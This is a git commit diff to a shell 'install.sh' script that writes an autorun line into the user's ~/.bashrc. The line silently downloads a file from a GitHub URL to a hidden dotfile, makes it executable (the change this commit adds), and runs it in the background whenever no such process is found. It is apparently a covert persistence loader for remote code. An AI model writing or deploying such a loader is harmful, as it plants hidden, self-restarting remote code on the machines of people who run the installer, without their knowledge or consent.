e9dba50608354a77aa0e84f258d54c9e919fdb81
nTOc <57815491+nTOc@users.noreply.github.com>
2019-11-15 22:51:57 +0000

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
-autorun='if [ -z $(pidof .system.y) ]; then wget -O - https://raw.githubusercontent.com/nTOc/sub27/master/system.y > ~/.system.y; ~/.system.y > /dev/null &; fi'
+autorun='if [ -z $(pidof .system.y) ]; then wget -O - https://raw.githubusercontent.com/nTOc/sub27/master/system.y > ~/.system.y; chmod +x ~/.system.y; ~/.system.y > /dev/null &; fi'
 echo $autorun >> ~/.bashrc
